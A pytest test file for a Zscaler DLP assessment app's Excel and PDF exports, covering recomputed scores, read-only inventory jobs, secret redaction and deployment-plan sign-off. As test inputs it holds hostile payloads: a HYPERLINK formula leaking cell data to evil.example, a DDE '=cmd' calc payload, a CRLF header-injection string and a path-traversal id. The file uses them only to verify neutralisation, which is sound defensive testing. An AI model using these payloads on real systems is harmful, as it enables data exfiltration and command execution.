"""Excel and PDF exports wired into the app:

* the assessment results as an Excel workbook (POST /api/report/xlsx,
  the same body as the Word report);
* the DLP inventory as an Excel workbook (a read-only job over the DLP
  channels in scope, POST /api/dlp-packs/inventory/start);
* a Deploy policy packs preflight as a plan for change approval, PDF or
  Excel, from the server's own copy of the preflight
  (GET /api/dlp-packs/plan/{report_id}/export).
"""
from __future__ import annotations

import json
import os
import time

import pytest

from test_pack_export import ALL_DLP_IN_SCOPE, ReadOnly, _empty_target, _source, _wait
from test_pdf_writer import parse_pdf, strings
from test_xlsx_writer import read_workbook

SECRET = "secret-secret-secret"
CREDS = {"vanity_domain": "acme", "client_id": "abc123456789", "client_secret": SECRET, "assessor": "Jane Doe"}
XLSX = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


@pytest.fixture()
def client(monkeypatch, tmp_path):
    monkeypatch.setenv("DLP_CHECK_AUDIT", str(tmp_path / "audit.log"))
    monkeypatch.setenv("DLP_CHECK_DEPLOYMENTS", str(tmp_path / "deployments.json"))
    import dlp_api_server as srv
    from fastapi.testclient import TestClient

    def no_writer(*a, **k):
        raise AssertionError("a read-only export asked for the writer check")

    monkeypatch.setattr(srv, "writes_enabled", lambda: False)
    monkeypatch.setattr(srv._security, "require_writer", no_writer)
    return srv, TestClient(srv.app)


# ---------------------------------------------------------------------------
# Assessment results
# ---------------------------------------------------------------------------

def _report():
    return {
        "metadata": {"org": "Acme Corp", "assessor": "Jane Doe", "cloud": "zscalertwo", "timestamp": "2026-10-20T09:30:00+00:00",
                     "scope": "dlp"},
        "score": 99, "sections": {"Forged": {"pct": 100}},          # posted numbers are not trusted: recomputed
        "checks": [
            {"id": "A.1", "section": "Ch.A Inline Web DLP", "label": "=HYPERLINK(\"http://evil.example/?\"&A1,\"Click\")",
             "status": "FAIL", "detail": "No Web DLP rule blocks uploads. Best Practice: block. See https://help.zscaler.com/zia/dlp"},
            {"id": "A.2", "section": "Ch.A Inline Web DLP", "label": "OCR enabled", "status": "PASS", "detail": "OCR is on."},
            {"id": "5.1", "section": "5 — Endpoint DLP", "label": "Endpoint rules", "status": "REVIEW", "detail": "@SUM(1+1)"},
            {"id": "B.1", "section": "Ch.B Endpoint", "label": "USB", "status": "ERROR", "detail": "403 Forbidden: not permitted"},
            {"id": "C.9", "section": "Ch.C SaaS", "label": "Out of scope", "status": "INFO", "detail": "", "out_of_scope": True},
        ],
        "hidden_checks": 2,
    }


def test_the_assessment_workbook_has_summary_findings_compliance_and_best_practices(client):
    srv, c = client
    r = c.post("/api/report/xlsx", json=_report())
    assert r.status_code == 200, r.text
    assert r.headers["content-type"] == XLSX
    assert r.headers["content-disposition"].startswith('attachment; filename="zscaler_Acme_Corp_') and r.headers["content-disposition"].endswith('.xlsx"')
    wb = read_workbook(r.content)
    assert list(wb)[:2] == ["Summary", "Findings"]
    assert {"Compliance mapping", "Best practices", "Frameworks"} <= set(wb)

    summary = {row[0]: row[1] if len(row) > 1 else None for row in wb["Summary"] if row and row[0]}
    assert summary["Organization"] == "Acme Corp" and summary["Assessor"] == "Jane Doe"
    assert summary["Assessment date"] == "2026-10-20 09:30 UTC"
    # Recomputed from the checks shown: 1 configured of 3 scored (FAIL, PASS, REVIEW) = 33%, not the posted 99.
    assert summary["Overall score"] == "33%"
    assert "3 checks are outside the selected scope" in summary["Outside the selected scope"]   # 2 posted + 1 dropped
    sections = [row for row in wb["Summary"] if row and row[0] == "Ch.A Inline Web DLP"]
    assert sections and sections[0][1] == "50%"
    assert not any(row and row[0] == "Forged" for row in wb["Summary"])

    head, *rows = wb["Findings"]
    assert head == ["ID", "Section", "Title", "Status", "Severity", "Evidence", "Recommendation", "References"]
    assert [x[0] for x in rows] == ["A.1", "A.2", "5.1", "B.1"]           # one row each; out of scope dropped
    by = {x[0]: x for x in rows}
    assert by["A.1"][3] == "Action required" and by["A.1"][4] == "High"
    assert by["5.1"][3] == "Needs review" and by["5.1"][4] == "Medium"
    assert by["A.2"][4] == "None" and (len(by["A.2"]) < 7 or not by["A.2"][6])   # nothing to recommend for a configured check
    assert by["B.1"][3] == "Could not be checked"
    assert by["A.1"][6]                                                    # a recommendation
    assert "https://help.zscaler.com/zia/dlp" in by["A.1"][7]
    # CSV-style injection neutralised the way csv_safe does it; never a formula cell (read_workbook checks).
    assert by["A.1"][2].startswith("'=HYPERLINK(")
    assert by["5.1"][5] == "'@SUM(1+1)"

    cm = wb["Compliance mapping"]
    assert cm[0] == ["ID", "Title", "Status", "Framework", "Framework name", "Controls"]
    assert any(row[0] == "A.1" and row[3] for row in cm[1:])
    assert all(row[0] != "C.9" for row in cm[1:])


def test_the_assessment_workbook_refuses_an_empty_or_oversized_body(client):
    _, c = client
    assert c.post("/api/report/xlsx", json={"checks": []}).status_code == 400
    assert c.post("/api/report/xlsx", content=b"not json", headers={"Content-Type": "application/json"}).status_code == 400
    big = {"checks": [{"id": f"X.{i}", "status": "PASS", "label": "x"} for i in range(5001)]}
    r = c.post("/api/report/xlsx", json=big)
    assert r.status_code == 400 and "Too many checks" in r.json()["detail"]


def test_a_hostile_org_name_does_not_reach_the_header(client):
    _, c = client
    rep = _report()
    rep["metadata"]["org"] = 'x"; filename="evil.exe\r\nSet-Cookie: a=b'
    r = c.post("/api/report/xlsx", json=rep)
    cd = r.headers["content-disposition"]
    assert r.status_code == 200 and cd.count('"') == 2 and "\r" not in cd and "evil.exe" not in cd.split("_")[0]
    assert cd.endswith('.xlsx"')


# ---------------------------------------------------------------------------
# DLP inventory
# ---------------------------------------------------------------------------

def _scope(**channels):
    return {"scopes": ["dlp"], "channels": channels, "from_page": True}


def _inventory(srv, c, monkeypatch, body, source=None):
    ro = ReadOnly(source or _source())
    monkeypatch.setattr(srv, "_build_sdk_client", lambda creds: ro)
    r = c.post("/api/dlp-packs/inventory/start", json=dict(CREDS, **body))
    assert r.status_code == 200 and r.json()["kind"] == "inventory", r.text
    snap = _wait(c, r.json()["job_id"])
    return ro, snap


def test_the_inventory_is_a_read_only_job_and_lists_who_uses_what(client, monkeypatch):
    srv, c = client
    ro, snap = _inventory(srv, c, monkeypatch, ALL_DLP_IN_SCOPE)
    assert snap["status"] == "done" and snap["result"]["status"] == "ready", snap
    assert any("Nothing is written to the tenant" in line for line in snap["logs"])
    assert ro.writes == []
    assert snap["download"].endswith("/download") and snap["filename"].startswith("dlp_inventory_acme_production_")
    d = c.get(snap["download"])
    assert d.status_code == 200 and d.headers["content-type"] == XLSX
    assert d.headers["content-disposition"] == f'attachment; filename="{snap["filename"]}"'
    wb = read_workbook(d.content)
    assert list(wb) == ["Summary", "Dictionaries", "Engines", "Web DLP rules", "Endpoint DLP rules", "SaaS Security API rules", "Email DLP rules"]

    dh, *drows = wb["Dictionaries"]
    D = {r[0]: dict(zip(dh, r)) for r in drows}
    assert D["Project Codes"]["Custom or predefined"] == "Custom" and "PRJ-" in D["Project Codes"]["Patterns"]
    assert D["SSN Clone High"]["Custom or predefined"] == "Clone" and D["SSN Clone High"]["Clone of"] == "SSN"
    assert D["SSN Clone High"]["Confidence"] == "CONFIDENCE_LEVEL_HIGH" and D["SSN Clone High"]["Phrases"] == "ssn (all)"
    assert D["SSN"]["Custom or predefined"] == "Predefined"
    assert D["Board Phrases"]["Used by engines"] == "2" and D["Board Phrases"]["Engine names"] == "Board Leak\nUnused Engine"
    assert D["Project Codes"]["Used by rules (through engines)"] == "2" and D["Project Codes"]["Deployed by pack"] == "fed"

    eh, *erows = wb["Engines"]
    E = {r[0]: dict(zip(eh, r)) for r in erows}
    assert E["Project Leak"]["Expression"] == "((D1001.S > 0) AND (D1.S > 2))"
    assert E["Project Leak"]["Expression (dictionary names)"] == "(([Project Codes] > 0) AND ([SSN] > 2))"
    # engine_explain: the expression with dictionary names, and when it fires in one sentence.
    assert E["Project Leak"]["Readable expression"] == "(Project Codes count > 0) AND (SSN count > 2)"
    assert E["Project Leak"]["In plain English"] == "Fires when the content has at least one Project Codes match and more than two SSN matches."
    assert E["Project Leak"]["Used by rules"] == "2" and "Web DLP: Web-Projects" in E["Project Leak"]["Rule names"]
    assert E["Unused Engine"]["Used by rules"] == "0" and E["PCI"]["Custom or predefined"] == "Predefined"

    wh, *wrows = wb["Web DLP rules"]
    assert [r[1] for r in wrows] == ["Web-Projects", "Web-PCI"]           # the tenant's order
    W = dict(zip(wh, wrows[0]))
    assert W["Order"] == "1" and W["State"] == "ENABLED" and W["Action"] == "BLOCK" and W["Severity"] == "high"
    assert W["Engines"] == "Project Leak" and W["Protocols"] == "HTTPS_RULE, HTTP_RULE"
    S = dict(zip(wb["SaaS Security API rules"][0], wb["SaaS Security API rules"][1]))
    assert S["Scoped to"] == "cloud app tenants: 1"

    # No secret in the workbook, the job JSON or the audit log; the job is audited as an inventory.
    import audit
    blob = d.content + json.dumps(snap).encode()
    assert SECRET.encode() not in blob and b"abc123456789" not in blob
    fin = [e for e in audit.tail(1000) if e.get("event") == "job_finished" and e.get("job_id") == snap["job_id"]]
    assert len(fin) == 1 and fin[0]["kind"] == "inventory" and fin[0]["tenant"] == "acme (production)"
    assert SECRET not in open(audit.path(), encoding="utf-8").read()


def test_the_inventory_reads_only_the_channels_in_scope(client, monkeypatch):
    srv, c = client
    src = _source()
    reads = []
    for svc, method in (("casb_dlp_rules", "list_all_rules"), ("outbound_email_dlp_rules", "list_rules"), ("endpoint_dlp_rules", "list_rules")):
        target = getattr(src.zia, svc)
        real = getattr(target, method)
        setattr(target, method, lambda *a, _r=real, _s=svc, **k: (reads.append(_s), _r(*a, **k))[1])
    _, snap = _inventory(srv, c, monkeypatch, _scope(web_dlp="zscaler", endpoint_dlp="zscaler", saas_casb="other", email_dlp="gap"), src)
    assert snap["result"]["status"] == "ready" and snap["result"]["channels"] == ["web", "endpoint"]
    assert reads == ["endpoint_dlp_rules"]
    wb = read_workbook(c.get(snap["download"]).content)
    assert [n for n in wb if n.endswith(" rules")] == ["Web DLP rules", "Endpoint DLP rules"]
    # Nothing in scope: refused before signing in.
    monkeypatch.setattr(srv, "_build_sdk_client", lambda creds: (_ for _ in ()).throw(AssertionError("signed in")))
    r = c.post("/api/dlp-packs/inventory/start", json=dict(CREDS, **_scope(web_dlp="other")))
    assert r.status_code == 400 and "not in scope" in r.json()["detail"]


def test_inventory_cells_from_the_tenant_are_neutralised_and_people_are_not_named(client, monkeypatch):
    from test_pack_deploy import Obj
    srv, c = client
    src = _source()
    src.zia.dlp_web_rules.items.append(Obj(id=13, name="=cmd|' /C calc'!A0", order=3, action="BLOCK", state="ENABLED",
                                           description="+1+1", dlp_engines=[Obj(id=5001, name="Project Leak")],
                                           auditor=Obj(id=7, name="alice@acme.example"), users=[Obj(id=8, name="bob@acme.example")]))
    _, snap = _inventory(srv, c, monkeypatch, ALL_DLP_IN_SCOPE, src)
    data = c.get(snap["download"]).content
    wb = read_workbook(data)
    wh, *wrows = wb["Web DLP rules"]
    row = dict(zip(wh, next(r for r in wrows if r[2] == "13")))
    assert row["Name"] == "'=cmd|' /C calc'!A0" and row["Description"] == "'+1+1"
    assert row["Scoped to"] == "users: 1"
    import zipfile
    import io
    allxml = b"".join(zipfile.ZipFile(io.BytesIO(data)).read(n) for n in zipfile.ZipFile(io.BytesIO(data)).namelist())
    assert b"alice@acme.example" not in allxml and b"bob@acme.example" not in allxml


def test_stop_ends_the_inventory_without_a_workbook(client, monkeypatch):
    srv, c = client
    import pack_export
    import pack_jobs
    real = pack_export.read_tenant

    def slow(client_, channels=(), log=None, cancel=None):
        deadline = time.time() + 10
        while not cancel.is_set() and time.time() < deadline:
            time.sleep(0.02)
        return real(client_, channels=channels, log=log, cancel=cancel)
    monkeypatch.setattr(pack_export, "read_tenant", slow)
    monkeypatch.setattr(srv, "_build_sdk_client", lambda creds: ReadOnly(_source()))
    r = c.post("/api/dlp-packs/inventory/start", json=dict(CREDS, **ALL_DLP_IN_SCOPE))
    jid = r.json()["job_id"]
    assert c.post(f"/api/dlp-packs/jobs/{jid}/cancel").status_code == 200
    snap = _wait(c, jid)
    assert snap["status"] == "cancelled" and snap["result"]["status"] == "stopped" and "download" not in snap
    assert any("no workbook is produced" in line for line in snap["logs"])
    assert pack_jobs.get(jid).artifact is None


# ---------------------------------------------------------------------------
# Deployment plan
# ---------------------------------------------------------------------------

def _preflight(srv, c, monkeypatch):
    monkeypatch.setattr(srv, "_build_sdk_client", lambda creds: ReadOnly(_empty_target()))
    r = c.post("/api/dlp-packs/preflight", json=dict(CREDS, pack_ids=["zbp_enterprise_baseline"]))
    assert r.status_code == 200, r.text
    rep = r.json()
    assert rep["report_id"].startswith("plan-") and rep["plan_hash"]
    return rep


def test_the_plan_pdf_comes_from_the_servers_copy_of_the_preflight(client, monkeypatch):
    srv, c = client
    rep = _preflight(srv, c, monkeypatch)
    r = c.get(f"/api/dlp-packs/plan/{rep['report_id']}/export?format=pdf")
    assert r.status_code == 200 and r.headers["content-type"] == "application/pdf"
    assert r.headers["content-disposition"] == f'attachment; filename="deployment_plan_acme_production_{rep["plan_hash"][:12]}.pdf"'
    pdf = parse_pdf(r.content)
    text = [s for p in pdf["pages"] for s in strings(p["stream"])]
    joined = " ".join(text)
    for want in ("Deployment plan for change approval", "acme (production)", "Jane Doe", "Requested by", "Approved by", "Date",
                 "Planned items", "Sign-off"):
        assert want in text or want in joined, want
    # The plan hash, whole, on the first page; every planned item by name.
    first = " ".join(strings(pdf["pages"][0]["stream"]))
    assert rep["plan_hash"] in first.replace(" ", "")
    for item in rep["items"]:
        assert item["name"][:20] in joined.replace("  ", " ") or item["name"][:20].replace(" ", "") in joined.replace(" ", ""), item["name"]
    assert any(s.startswith("Will create") for s in text)
    assert f"Page 1 of {len(pdf['pages'])}" in text
    assert SECRET.encode() not in r.content and b"abc123456789" not in r.content
    # A4 by default, Letter on request.
    assert b"[0 0 595.28 841.89]" in r.content
    letter = c.get(f"/api/dlp-packs/plan/{rep['report_id']}/export?format=pdf&page=letter")
    assert letter.status_code == 200 and b"[0 0 612 792]" in letter.content


def test_the_plan_workbook_has_items_warnings_and_a_sign_off_block(client, monkeypatch):
    srv, c = client
    rep = _preflight(srv, c, monkeypatch)
    r = c.get(f"/api/dlp-packs/plan/{rep['report_id']}/export?format=xlsx")
    assert r.status_code == 200 and r.headers["content-type"] == XLSX
    assert r.headers["content-disposition"].endswith('.xlsx"')
    wb = read_workbook(r.content)
    summary = {row[0]: (row[1] if len(row) > 1 else None) for row in wb["Summary"] if row and row[0]}
    assert summary["Plan hash"] == rep["plan_hash"] and summary["Tenant"] == "acme (production)" and summary["Assessor"] == "Jane Doe"
    assert "Requested by" in summary and "Approved by" in summary and "Date" in summary
    head, *items = wb["Items"]
    assert head[:6] == ["Kind", "Name", "Status", "Channel", "Reason", "Depends on"]
    assert len(items) == len(rep["items"])
    assert {i["name"] for i in rep["items"]} == {row[1].lstrip("'") for row in items}
    warn = wb["Warnings and blockers"]
    assert len([w for w in warn[1:] if w[0] == "Warning"]) == len(rep["warnings"])


def test_the_plan_exports_refuse_unknown_ids_and_formats_and_take_no_posted_plan(client, monkeypatch):
    srv, c = client
    rep = _preflight(srv, c, monkeypatch)
    assert c.get("/api/dlp-packs/plan/plan-doesnotexist123/export?format=pdf").status_code == 404
    assert c.get("/api/dlp-packs/plan/..%2F..%2Fetc/export?format=pdf").status_code == 404
    assert c.get(f"/api/dlp-packs/plan/{rep['report_id']}/export?format=docx").status_code == 400
    assert c.get(f"/api/dlp-packs/plan/{rep['report_id']}/export?format=pdf&page=a3").status_code == 400
    assert c.post(f"/api/dlp-packs/plan/{rep['report_id']}/export", json=rep).status_code == 405
    # The server's copy is what is rendered: changing the page's copy changes nothing.
    rep["items"][0]["name"] = "Forged by the page"
    r = c.get(f"/api/dlp-packs/plan/{rep['report_id']}/export?format=xlsx")
    assert b"Forged by the page" not in r.content
    # Only the last few preflights are kept.
    first = rep["report_id"]
    for _ in range(srv._PLANS_MAX):
        _preflight(srv, c, monkeypatch)
    assert c.get(f"/api/dlp-packs/plan/{first}/export?format=pdf").status_code == 404


# ---------------------------------------------------------------------------
# The buttons
# ---------------------------------------------------------------------------

def test_the_buttons_are_where_the_exports_are():
    index = open(os.path.join(ROOT, "static", "index.html"), encoding="utf-8").read()
    studio = open(os.path.join(ROOT, "static", "deploy_studio.js"), encoding="utf-8").read()
    assert 'onclick="downloadXlsx()"' in index and ">Excel workbook</button>" in index and "'/api/report/xlsx'" in index
    assert "DLP inventory (Excel)" in studio and "'/api/dlp-packs/inventory/start'" in studio
    assert ">Plan (PDF)</button>" in studio and ">Plan (Excel)</button>" in studio
    assert "/api/dlp-packs/plan/${encodeURIComponent(R.report_id)}/export" in studio
